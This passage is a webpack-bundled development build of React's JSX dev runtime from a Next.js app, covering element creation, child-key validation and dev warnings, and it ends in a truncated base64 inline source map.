value: null });\n      type._store = {};\n      Object.defineProperty(type._store, \"validated\", {\n        configurable: !1,\n        enumerable: !1,\n        writable: !0,\n        value: 0\n      });\n      Object.defineProperty(type, \"_debugInfo\", {\n        configurable: !1,\n        enumerable: !1,\n        writable: !0,\n        value: null\n      });\n      Object.defineProperty(type, \"_debugStack\", {\n        configurable: !1,\n        enumerable: !1,\n        writable: !0,\n        value: debugStack\n      });\n      Object.defineProperty(type, \"_debugTask\", {\n        configurable: !1,\n        enumerable: !1,\n        writable: !0,\n        value: debugTask\n      });\n      Object.freeze && (Object.freeze(type.props), Object.freeze(type));\n      return type;\n    }\n    function jsxDEVImpl(\n      type,\n      config,\n      maybeKey,\n      isStaticChildren,\n      debugStack,\n      debugTask\n    ) {\n      var children = config.children;\n      if (void 0 !== children)\n        if (isStaticChildren)\n          if (isArrayImpl(children)) {\n            for (\n              isStaticChildren = 0;\n              isStaticChildren < children.length;\n              isStaticChildren++\n            )\n              validateChildKeys(children[isStaticChildren]);\n            Object.freeze && Object.freeze(children);\n          } else\n            console.error(\n              \"React.jsx: Static children should always be an array. You are likely explicitly calling React.jsxs or React.jsxDEV. Use the Babel transform instead.\"\n            );\n        else validateChildKeys(children);\n      if (hasOwnProperty.call(config, \"key\")) {\n        children = getComponentNameFromType(type);\n        var keys = Object.keys(config).filter(function (k) {\n          return \"key\" !== k;\n        });\n        isStaticChildren =\n          0 < keys.length\n            ? \"{key: someKey, \" + keys.join(\": ..., \") + \": ...}\"\n            : \"{key: someKey}\";\n        didWarnAboutKeySpread[children + isStaticChildren] ||\n          ((keys =\n            0 < keys.length ? \"{\" + keys.join(\": ..., \") + \": ...}\" : \"{}\"),\n          console.error(\n            'A props object containing a \"key\" prop is being spread into JSX:\\n  let props = %s;\\n  <%s {...props} />\\nReact keys must be passed directly to JSX without using spread:\\n  let props = %s;\\n  <%s key={someKey} {...props} />',\n            isStaticChildren,\n            children,\n            keys,\n            children\n          ),\n          (didWarnAboutKeySpread[children + isStaticChildren] = !0));\n      }\n      children = null;\n      void 0 !== maybeKey &&\n        (checkKeyStringCoercion(maybeKey), (children = \"\" + maybeKey));\n      hasValidKey(config) &&\n        (checkKeyStringCoercion(config.key), (children = \"\" + config.key));\n      if (\"key\" in config) {\n        maybeKey = {};\n        for (var propName in config)\n          \"key\" !== propName && (maybeKey[propName] = config[propName]);\n      } else maybeKey = config;\n      children &&\n        defineKeyPropWarningGetter(\n          maybeKey,\n          \"function\" === typeof type\n            ? type.displayName || type.name || \"Unknown\"\n            : type\n        );\n      return ReactElement(\n        type,\n        children,\n        maybeKey,\n        getOwner(),\n        debugStack,\n        debugTask\n      );\n    }\n    function validateChildKeys(node) {\n      isValidElement(node)\n        ? node._store && (node._store.validated = 1)\n        : \"object\" === typeof node &&\n          null !== node &&\n          node.$$typeof === REACT_LAZY_TYPE &&\n          (\"fulfilled\" === node._payload.status\n            ? isValidElement(node._payload.value) &&\n              node._payload.value._store &&\n              (node._payload.value._store.validated = 1)\n            : node._store && (node._store.validated = 1));\n    }\n    function isValidElement(object) {\n      return (\n        \"object\" === typeof object &&\n        null !== object &&\n        object.$$typeof === REACT_ELEMENT_TYPE\n      );\n    }\n    var React = __webpack_require__(/*! next/dist/compiled/react */ \"(app-pages-browser)/./node_modules/.pnpm/next@16.0.6_@babel+core@7.28.5_react-dom@19.2.0_react@19.2.0__react@19.2.0/node_modules/next/dist/compiled/react/index.js\"),\n      REACT_ELEMENT_TYPE = Symbol.for(\"react.transitional.element\"),\n      REACT_PORTAL_TYPE = Symbol.for(\"react.portal\"),\n      REACT_FRAGMENT_TYPE = Symbol.for(\"react.fragment\"),\n      REACT_STRICT_MODE_TYPE = Symbol.for(\"react.strict_mode\"),\n      REACT_PROFILER_TYPE = Symbol.for(\"react.profiler\"),\n      REACT_CONSUMER_TYPE = Symbol.for(\"react.consumer\"),\n      REACT_CONTEXT_TYPE = Symbol.for(\"react.context\"),\n      REACT_FORWARD_REF_TYPE = Symbol.for(\"react.forward_ref\"),\n      REACT_SUSPENSE_TYPE = Symbol.for(\"react.suspense\"),\n      REACT_SUSPENSE_LIST_TYPE = Symbol.for(\"react.suspense_list\"),\n      REACT_MEMO_TYPE = Symbol.for(\"react.memo\"),\n      REACT_LAZY_TYPE = Symbol.for(\"react.lazy\"),\n      REACT_ACTIVITY_TYPE = Symbol.for(\"react.activity\"),\n      REACT_VIEW_TRANSITION_TYPE = Symbol.for(\"react.view_transition\"),\n      REACT_CLIENT_REFERENCE = Symbol.for(\"react.client.reference\"),\n      ReactSharedInternals =\n        React.__CLIENT_INTERNALS_DO_NOT_USE_OR_WARN_USERS_THEY_CANNOT_UPGRADE,\n      hasOwnProperty = Object.prototype.hasOwnProperty,\n      isArrayImpl = Array.isArray,\n      createTask = console.createTask\n        ? console.createTask\n        : function () {\n            return null;\n          };\n    React = {\n      react_stack_bottom_frame: function (callStackForError) {\n        return callStackForError();\n      }\n    };\n    var specialPropKeyWarningShown;\n    var didWarnAboutElementRef = {};\n    var unknownOwnerDebugStack = React.react_stack_bottom_frame.bind(\n      React,\n      UnknownOwner\n    )();\n    var unknownOwnerDebugTask = createTask(getTaskName(UnknownOwner));\n    var didWarnAboutKeySpread = {};\n    exports.Fragment = REACT_FRAGMENT_TYPE;\n    exports.jsxDEV = function (type, config, maybeKey, isStaticChildren) {\n      var trackActualOwner =\n        1e4 > ReactSharedInternals.recentlyCreatedOwnerStacks++;\n      if (trackActualOwner) {\n        var previousStackTraceLimit = Error.stackTraceLimit;\n        Error.stackTraceLimit = 10;\n        var debugStackDEV = Error(\"react-stack-top-frame\");\n        Error.stackTraceLimit = previousStackTraceLimit;\n      } else debugStackDEV = unknownOwnerDebugStack;\n      return jsxDEVImpl(\n        type,\n        config,\n        maybeKey,\n        isStaticChildren,\n        debugStackDEV,\n        trackActualOwner ? createTask(getTaskName(type)) : unknownOwnerDebugTask\n      );\n    };\n  })();\n//# sourceURL=[module]\n//# sourceMappingURL=data:application/json;charset=utf-8;base64,eyJ2ZXJzaW9uIjozLCJmaWxlIjoiKGFwcC1wYWdlcy1icm93c2VyKS8uL25vZGVfbW9kdWxlcy8ucG5wbS9uZXh0QDE2LjAuNl9AYmFiZWwrY29yZUA3LjI4LjVfcmVhY3QtZG9tQDE5LjIuMF9yZWFjdEAxOS4yLjBfX3JlYWN0QDE5LjIuMC9ub2RlX21vZHVsZXMvbmV4dC9kaXN0L2NvbXBpbGVkL3JlYWN0L2Nqcy9yZWFjdC1qc3gtZGV2LXJ1bnRpbWUuZGV2ZWxvcG1lbnQuanMiLCJtYXBwaW5ncyI6IkFBQUE7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBOztBQUVhO0FBQ2IsS0FBcUM7QUFDckM7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0EsY0FBYztBQUNkO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0EsUUFBUTtBQUNSO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBLFFBQVE7QUFDUjtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQSxPQUFPO0FBQ1A7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0EsV0FBVztBQUNYLCtDQUErQyw2QkFBNkI7QUFDNUU7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0EsT0FBTztBQUNQO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQSxPQUFPO0FBQ1A7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBLE9BQU87QUFDUDtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0EsT0FBTztBQUNQO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0EsWUFBWTtBQUNaO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQSxTQUFTO0FBQ1Q7QUFDQTtBQUNBLGdCQUFnQixnREFBZ0Q7QUFDaEUsZ0JBQWdCLGFBQWE7QUFDN0I7QUFDQTtBQUNBLGdDQUFnQyxrQ0FBa0MsT0FBTztBQUN6RTtBQUNBLGdHQUFnRyxTQUFTLFVBQVUsc0ZBQXNGLGFBQWEsVUFBVSxVQUFVO0FBQzFPO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0EsUUFBUTtBQUNSO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQSxnQkFBZ0IsbUJBQU8sQ0FBQyxvTUFBMEI7QUFDbEQ7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQSxJQUFJLGdCQUFnQjtBQUNwQixJQUFJLGNBQWM7QUFDbEI7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQSxRQUFRO0FBQ1I7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0EsR0FBRyIsInNvdXJjZXMiOlsiL2FwcC9ub2RlX21vZHVsZXMvLnBucG0vbmV4dEAxNi4wLjZfQGJhYmVsK2NvcmVANy4yOC41X3JlYWN0LWRvbUAxOS4yLjBfcmVhY3RAMTkuMi4wX19yZWFjdEAxOS4yLjAvbm9kZV9tb2R1bGVzL25leHQvZGlzdC9jb21waWxlZC9yZWFjdC9janMvcmVhY3QtanN4LWRldi1ydW50aW1lLmRldmVsb3BtZW50LmpzIl0sInNvdXJjZXNDb250ZW50IjpbIi8qKlxuICogQGxpY2Vuc2UgUmVhY3RcbiAqIHJlYWN0LWpzeC1kZXYtcnVudGltZS5kZXZlbG9wbWVudC5qc1xuICpcbiAqIENvcHlyaWdodCAoYykgTWV0YSBQbGF0Zm9ybXMsIEluYy4gYW5kIGFmZmlsaWF0ZXMuXG4gKlxuICogVGhpcyBzb3VyY2UgY29kZSBpcyBsaWNlbnNlZCB1bmRlciB0aGUgTUlUIGxpY2Vuc2UgZm91bmQgaW4gdGhlXG4gKiBMSUNFTlNFIGZpbGUgaW4gdGhlIHJvb3QgZGlyZWN0b3J5IG9mIHRoaXMgc291cmNlIHRyZWUuXG4gKi9cblxuXCJ1c2Ugc3RyaWN0XCI7XG5cInByb2R1Y3Rpb25cIiAhPT0gcHJvY2Vzcy5lbnYuTk9ERV9FTlYgJiZcbiAgKGZ1bmN0aW9uICgpIHtcbiAgICBmdW5jdGlvbiBnZXRDb21wb25lbnROYW1lRnJvbVR5cGUodHlwZSkge1xuICAgICAgaWYgKG51bGwgPT0gdHlwZSkgcmV0dXJuIG51bGw7XG4gICAgICBpZiAoXCJmdW5jdGlvblwiID09PSB0eXBlb2YgdHlwZSlcbiAgICAgICAgcmV0dXJuIHR5cGUuJCR0eXBlb2YgPT09IFJFQUNUX0NMSUVOVF9SRUZFUkVOQ0VcbiAgICAgICAgICA/IG51bGxcbiAgICAgICAgICA6IHR5cGUuZGlzcGxheU5hbWUgfHwgdHlwZS5uYW1lIHx8IG51bGw7XG4gICAgICBpZiAoXCJzdHJpbmdcIiA9PT0gdHlwZW9mIHR5cGUpIHJldHVybiB0eXBlO1xuICAgICAgc3dpdGNoICh0eXBlKSB7XG4gICAgICAgIGNhc2UgUkVBQ1RfRlJBR01FTlRfVFlQRTpcbiAgICAgICAgICByZXR1cm4gXCJGcmFnbWVudFwiO1xuICAgICAgICBjYXNlIFJFQUNUX1BST0ZJTEVSX1RZUEU6XG4gICAgICAgICAgcmV0dXJuIFwiUHJvZmlsZXJcIjtcbiAgICAgICAgY2FzZSBSRUFDVF9TVFJJQ1RfTU9ERV9UWVBFOlxuICAgICAgICAgIHJldHVybiBcIlN0cmljdE1vZGVcIjtcbiAgICAgICAgY2FzZSBSRUFDVF9TVVNQRU5TRV9UWVBFOlxuICAgICAgICAgIHJldHVybiBcIlN1c3BlbnNlXCI7XG4gICAgICAgIGNhc2UgUkVBQ1RfU1VTUEVOU0VfTElTVF9UWVBFOlxuICAgICAgICAgIHJldHVybiBcIlN1c3BlbnNlTGlzdFwiO1xuICAgICAgICBjYXNlIFJFQUNUX0FDVElWSVRZX1RZUEU6XG4gICAgICAgICAgcmV0dXJuIFwiQWN0aXZpdHlcIjtcbiAgICAgICAgY2FzZSBSRUFDVF9WSUVXX1RSQU5TSVRJT05fVFlQRTpcbiAgICAgICAgICByZXR1cm4gXCJWaWV3VHJhbnNpdGlvblwiO1xuICAgICAgfVxuICAgICAgaWYgKFwib2JqZWN0XCIgPT09IHR5cGVvZiB0eXBlKVxuICAgICAgICBzd2l0Y2ggKFxuICAgICAgICAgIChcIm51bWJlclwiID09PSB0eXBlb2YgdHlwZS50YWcgJiZcbiAgICAgICAgICAgIGNvbnNvbGUuZXJyb3IoXG4gICAgICAgICAgICAgIFwiUmVjZWl2ZWQgYW4gdW5leHBlY3RlZCBvYmplY3QgaW4gZ2V0Q29tcG9uZW50TmFtZUZyb21UeXBlKCkuIFRoaXMgaXMgbGlrZWx5IGEgYnVnIGluIFJlYWN0LiBQbGVhc2UgZmlsZSBhbiBpc3N1ZS5cIlxuICAgICAgICAgICAgKSxcbiAgICAgICAgICB0eXBlLiQkdHlwZW9mKVxuICAgICAgICApIHtcbiAgICAgICAgICBjYXNlIFJFQUNUX1BPUlRBTF9UWVBFOlxuICAgICAgICAgICAgcmV0dXJuIFwiUG9ydGFsXCI7XG4gICAgICAgICAgY2FzZSBSRUFDVF9DT05URVhUX1RZUEU6XG4gICAgICAgICAgICByZXR1cm4gdHlwZS5kaXNwbGF5TmFtZSB8fCBcIkNvbnRleHRcIjtcbiAgICAgICAgICBjYXNlIFJFQUNUX0NPTlNVTUVSX1RZUEU6XG4gICAgICAgICAgICByZXR1cm4gKHR5cGUuX2NvbnRleHQuZGlzcGxheU5hbWUgfHwgXCJDb250ZXh0XCIpICsgXCIuQ29uc3VtZXJcIjtcbiAgICAgICAgICBjYXNlIFJFQUNUX0ZPUldBUkRfUkVGX1RZUEU6XG4gICAgICAgICAgICB2YXIgaW5uZXJUeXBlID0gdHlwZS5yZW5kZXI7XG4gICAgICAgICAgICB0eXBlID0gdHlwZS5kaXNwbGF5TmFtZTtcbiAgICAgICAgICAgIHR5cGUgfHxcbiAgICAgICAgICAgICAgKCh0eXBlID0gaW5uZXJUeXBlLmRpc3BsYXlOYW1lIHx8IGlubmVyVHlwZS5uYW1lIHx8IFwiXCIpLFxuICAgICAgICAgICAgICAodHlwZSA9IFwiXCIgIT09IHR5cGUgPyBcIkZvcndhcmRSZWYoXCIgKyB0eXBlICsgXCIpXCIgOiBcIkZvcndhcmRSZWZcIikpO1xuICAgICAgICAgICAgcmV0dXJuIHR5cGU7XG4gICAgICAgICAgY2FzZSBSRUFDVF9NRU1PX1RZUEU6XG4gICAgICAgICAgICByZXR1cm4gKFxuICAgICAgICAgICAgICAoaW5uZXJUeXBlID0gdHlwZS5kaXNwbGF5TmFtZSB8fCBudWxsKSxcbiAgICAgICAgICAgICAgbnVsbCAhPT0gaW5uZXJUeXBlXG4gICAgICAgICAgICAgICAgPyBpbm5lclR5cGVcbiAgICAgICAgICAgICAgICA6IGdldENvbXBvbmVudE5hbWVGcm9tVHlwZSh0eXBlLnR5cGUpIHx8IFwiTWVtb1wiXG4gICAgICAgICAgICApO1xuICAgICAgICAgIGNhc2UgUkVBQ1RfTEFaWV9UWVBFOlxuICAgICAgICAgICAgaW5uZXJUeXBlID0gdHlwZS5fcGF5bG9hZDtcbiAgICAgICAgICAgIHR5cGUgPSB0eXBlLl9pbml0O1xuICAgICAgICAgICAgdHJ5IHtcbiAgICAgICAgICAgICAgcmV0dXJuIGdldENvbXBvbmVudE5hbWVGcm9tVHlwZSh0eXBlKGlubmVyVHlwZSkpO1xuICAgICAgICAgICAgfSBjYXRjaCAoeCkge31cbiAgICAgICAgfVxuICAgICAgcmV0dXJuIG51bGw7XG4gICAgfVxuICAgIGZ1bmN0aW9uIHRlc3RTdHJpbmdDb2VyY2lvbih2YWx1ZSkge1xuICAgICAgcmV0dXJuIFwiXCIgKyB2YWx1ZTtcbiAgICB9XG4gICAgZnVuY3Rpb24gY2hlY2tLZXlTdHJpbmdDb2VyY2lvbih2YWx1ZSkge1xuICAgICAgdHJ5IHtcbiAgICAgICAgdGVzdFN0cmluZ0NvZXJjaW9uKHZhbHVlKTtcbiAgICAgICAgdmFyIEpTQ29tcGlsZXJfaW5saW5lX3Jlc3VsdCA9ICExO1xuICAgICAgfSBjYXRjaCAoZSkge1xuICAgICAgICBKU0NvbXBpbGVyX2lubGluZV9yZXN1bHQgPSAhMDtcbiAgICAgIH1cbiAgICAgIGlmIChKU0NvbXBpbGVyX2lubGluZV9yZXN1bHQpIHtcbiAgICAgICAgSlNDb21waWxlcl9pbmxpbmVfcmVzdWx0ID0gY29uc29sZTtcbiAgICAgICAgdmFyIEpTQ29tcGlsZXJfdGVtcF9jb25zdCA9IEpTQ29tcGlsZXJfaW5saW5lX3Jlc3VsdC5lcnJvcjtcbiAgICAgICAgdmFyIEpTQ29tcGlsZXJfaW5saW5lX3Jlc3VsdCRqc2NvbXAkMCA9XG4gICAgICAgICAgKFwiZnVuY3Rpb25cIiA9PT0gdHlwZW9mIFN5bWJvbCAmJlxuICAgICAgICAgICAgU3ltYm9sLnRvU3RyaW5nVGFnICYmXG4gICAgICAgICAgICB2YWx1ZVtTeW1ib2wudG9TdHJpbmdUYWddKSB8fFxuICAgICAgICAgIHZhbHVlLmNvbnN0cnVjdG9yLm5hbWUgfHxcbiAgICAgICAgICBcIk9iamVjdFwiO1xuICAgICAgICBKU0NvbXBpbGVyX3RlbXBfY29uc3QuY2FsbChcbiAgICAgICAgICBKU0NvbXBpbGVyX2lubGluZV9yZXN1bHQsXG4gICAgICAgICAgXCJUaGUgcHJvdmlkZWQga2V5IGlzIGFuIHVuc3VwcG9ydGVkIHR5cGUgJXMuIFRoaXMgdmFsdWUgbXVzdCBiZSBjb2VyY2VkIHRvIGEgc3RyaW5nIGJlZm9yZSB1c2luZyBpdCBoZXJlLlwiLFxuICAgICAgICAgIEpTQ29tcGlsZXJfaW5saW5lX3Jlc3VsdCRqc2NvbXAkMFxuICAgICAgICApO1xuICAgICAgICByZXR1cm4gdGVzdFN0cmluZ0NvZXJjaW9uKHZhbHVlKTtcbiAgICAgIH1cbiAgICB9XG4gICAgZnVuY3Rpb24gZ2V0VGFza05hbWUodHlwZSkge1xuICAgICAgaWYgKHR5cGUgPT09IFJFQUNUX0ZSQUdNRU5UX1RZUEUpIHJldHVybiBcIjw+XCI7XG4gICAgICBpZiAoXG4gICAgICAgIFwib2JqZWN0XCIgPT09IHR5cGVvZiB0eXBlICYmXG4gICAgICAgIG51bGwgIT09IHR5cGUgJiZcbiAgICAgICAgdHlwZS4kJHR5cGVvZiA9PT0gUkVBQ1RfTEFaWV9UWVBFXG4gICAgICApXG4gICAgICAgIHJldHVybiBcIjwuLi4+XCI7XG4gICAgICB0cnkge1xuICAgICAgICB2YXIgbmFtZSA9IGdldENvbXBvbmVudE5hbWVGcm9tVHlwZSh0eXBlKTtcbiAgICAgICAgcmV0dXJuIG5hbWUgPyBcIjxcIiArIG5hbWUgKyBcIj5cIiA6IFwiPC4uLj5cIjtcbiAgICAgIH0gY2F0Y2ggKHgpIHtcbiAgICAgICAgcmV0dXJuIFwiPC4uLj5cIjtcbiAgICAgIH1cbiAgICB9XG4gICAgZnVuY3Rpb24gZ2V0T3duZXIoKSB7XG4gICAgICB2YXIgZGlzcGF0Y2hlciA9IFJlYWN0U2hhcmVkSW50ZXJuYWxzLkE7XG4gICAgICByZXR1cm4gbnVsbCA9PT0gZGlzcGF0Y2hlciA/IG51bGwgOiBkaXNwYXRjaGVyLmdldE93bmVyKCk7XG4gICAgfVxuICAgIGZ1bmN0aW9uIFVua25vd25Pd25lcigpIHtcbiAgICAgIHJldHVybiBFcnJvcihcInJlYWN0LXN0YWNrLXRvcC1mcmFtZVwiKTtcbiAgICB9XG4gICAgZnVuY3Rpb24gaGFzVmFsaWRLZXkoY29uZmlnKSB7XG4gICAgICBpZiAoaGFzT3duUHJvcGVydHkuY2FsbChjb25maWcsIFwia2V5XCIpKSB7XG4gICAgICAgIHZhciBnZXR0ZXIgPSBPYmplY3QuZ2V0T3duUHJvcGVydHlEZXNjcmlwdG9yKGNvbmZpZywgXCJrZXlcIikuZ2V0O1xuICAgICAgICBpZiAoZ2V0dGVyICYmIGdldHRlci5pc1JlYWN0V2FybmluZykgcmV0dXJuICExO1xuICAgICAgfVxuICAgICAgcmV0dXJuIHZvaWQgMCAhPT0gY29uZmlnLmtleTtcbiAgICB9XG4gICAgZnVuY3Rpb24gZGVmaW5lS2V5UHJvcFdhcm5pbmdHZXR0ZXIocHJvcHMsIGRpc3BsYXlOYW1lKSB7XG4gICAgICBmdW5jdGlvbiB3YXJuQWJvdXRBY2Nlc3NpbmdLZXkoKSB7XG4gICAgICAgIHNwZWNpYWxQcm9wS2V5V2FybmluZ1Nob3duIHx8XG4gICAgICAgICAgKChzcGVjaWFsUHJvcEtleVdhcm5pbmdTaG93biA9ICEwKSxcbiAgICAgICAgICBjb25zb2xlLmVycm9yKFxuICAgICAgICAgICAgXCIlczogYGtleWAgaXMgbm90IGEgcHJvcC4gVHJ5aW5nIHRvIGFjY2VzcyBpdCB3aWxsIHJlc3VsdCBpbiBgdW5kZWZpbmVkYCBiZWluZyByZXR1cm5lZC4gSWYgeW91IG5lZWQgdG8gYWNjZXNzIHRoZSBzYW1lIHZhbHVlIHdpdGhpbiB0aGUgY2hpbGQgY29tcG9uZW50LCB5b3Ugc2hvdWxkIHBhc3MgaXQgYXMgYSBkaWZmZXJlbnQgcHJvcC4gKGh0dHBzOi8vcmVhY3QuZGV2L2xpbmsvc3BlY2lhbC1wcm9wcylcIixcbiAgICAgICAgICAgIGRpc3BsYXlOYW1lXG4gICAgICAgICAgKSk7XG4gICAgICB9XG4gICAgICB3YXJuQWJvdXRBY2Nlc3NpbmdLZXkuaXNSZWFjdFdhcm5pbmcgPSAhMDtcbiAgICAgIE9iamVjdC5kZWZpbmVQcm9wZXJ0eShwcm9wcywgXCJrZXlcIiwge1xuICAgICAgICBnZXQ6IHdhcm5BYm91dEFjY2Vzc2luZ0tleSxcbiAgICAgICAgY29uZmlndXJhYmxlOiAhMFxuICAgICAgfSk7XG4gICAgfVxuICAgIGZ1bmN0aW9uIGVsZW1lbnRSZWZHZXR0ZXJXaXRoRGVwcmVjYXRpb25XYXJuaW5nKCkge1xuICAgICAgdmFyIGNvbXBvbmVudE5hbWUgPSBnZXRDb21wb25lbnROYW1lRnJvbVR5cGUodGhpcy50eXBlKTtcbiAgICAgIGRpZFdhcm5BYm91dEVsZW1lbnRSZWZbY29tcG9uZW50TmFtZV0gfHxcbiAgICAgICAgKChkaWRXYXJuQWJvdXRFbGVtZW50UmVmW2NvbXBvbmVudE5hbWVdID0gITApLFxuICAgICAgICBjb25zb2xlLmVycm9yKFxuICAgICAgICAgIFwiQWNjZXNzaW5nIGVsZW1lbnQucmVmIHdhcyByZW1vdmVkIGluIFJlYWN0IDE5LiByZWYgaXMgbm93IGEgcmVndWxhciBwcm9wLiBJdCB3aWxsIGJlIHJlbW92ZWQgZnJvbSB0aGUgSlNYIEVsZW1lbnQgdHlwZSBpbiBhIGZ1dHVyZSByZWxlYXNlLlwiXG4gICAgICAgICkpO1xuICAgICAgY29tcG9uZW50TmFtZSA9IHRoaXMucHJvcHMucmVmO1xuICAgICAgcmV0dXJuIHZvaWQgMCAhPT0gY29tcG9uZW50TmFtZSA/IGNvbXBvbmVudE5hbWUgOiBudWxsO1xuICAgIH1cbiAgICBmdW5jdGlvbiBSZWFjdEVsZW1lbnQodHlwZSwga2V5LCBwcm9wcywgb3duZXIsIGRlYnVnU3RhY2ssIGRlYnVnVGFzaykge1xuICAgICAgdmFyIHJlZlByb3AgPSBwcm9wcy5yZWY7XG4gICAgICB0eXBlID0ge1xuICAgICAgICAkJHR5cGVvZjogUkVBQ1RfRUxFTUVOVF9UWVBFLFxuICAgICAgICB0eXBlOiB0eXBlLFxuICAgICAgICBrZXk6IGtleSxcbiAgICAgICAgcHJvcHM6IHByb3BzLFxuICAgICAgICBfb3duZXI6IG93bmVyXG4gICAgICB9O1xuICAgICAgbnVsbCAhPT0gKHZvaWQgMCAhPT0gcmVmUHJvcCA/IHJlZlByb3AgOiBudWxsKVxuICAgICAgICA/IE9iamVjdC5kZWZpbmVQcm9wZXJ0eSh0eXBlLCBcInJlZlwiLCB7XG4gICAgICAgICAgICBlbnVtZXJhYmxlOiAhMSxcbiAgICAgICAgICAgIGdldDogZWxlbWVudFJlZkdldHRlcldpdGhEZXByZWNhdGlvbldhcm5pbmdcbiAgICAgICAgICB9KVxuICAgICAgICA6IE9iamVjdC5kZWZpbmVQcm9wZXJ0eSh0eXBlLCBcInJlZlwiLCB7IGVudW1lcmFibGU6ICExLCB2YWx1ZTogbnVsbCB9KTtcbiAgICAgIHR5cGUuX3N0b3JlID0ge307XG4gICAgICBPYmplY3QuZGVmaW5lUHJvcGVydHkodHlwZS5fc3RvcmUsIFwidmFsaWRhdGVkXCIsIHtcbiAgICAgICAgY29uZmlndXJhYmxlOiAhMSxcbiAgICAgICAgZW51bWVyYWJsZTogITEsXG4gICAgICAgIHdyaXRhYmxlOiAhMCxcbiAgICAgICAgdmFsdWU6IDBcbiAgICAgIH0pO1xuICAgICAgT2JqZWN0LmRlZmluZVByb3BlcnR5KHR5cGUsIFwiX2RlYnVnSW5mb1wiLCB7XG4gICAgICAgIGNvbmZpZ3VyYWJsZTogITEsXG4gICAgICAgIGVudW1lcmFibGU6ICExLFxuICAgICAgICB3cml0YWJsZTogITAsXG4gICAgICAgIHZhbHVlOiBudWxsXG4gICAgICB9KTtcbiAgICAgIE9iamVjdC5kZWZpbmVQcm9wZXJ0eSh0eXBlLCBcIl9kZWJ1Z1N0YWNrXCIsIHtcbiAgICAgICAgY29uZmlndXJhYmxlOiAhMSxcbiAgICAgICAgZW51bWVyYWJsZTogITEsXG4gICAgICAgIHdyaXRhYmxlOiAhMCxcbiAgICAgICAgdmFsdWU6IGRlYnVnU3RhY2tcbiAgICAgIH0pO1xuICAgICAgT2JqZWN0LmRlZmluZVByb3BlcnR5KHR5cGUsIFwiX2RlYnVnVGFza1wiLCB7XG4gICAgICAgIGNvbmZpZ3VyYWJsZTogITEsXG4gICAgICAgIGVudW1lcmFibGU6ICExLFxuICAgICAgICB3cml0YWJsZTogITAsXG4gICAgICAgIHZhbHVlOiBkZWJ1Z1Rhc2tcbiAgICAgIH0pO1xuICAgICAgT2JqZWN0LmZyZWV6ZSAmJiAoT2JqZWN0LmZyZWV6ZSh0eXBlLnByb3BzKSwgT2JqZWN0LmZyZWV6Z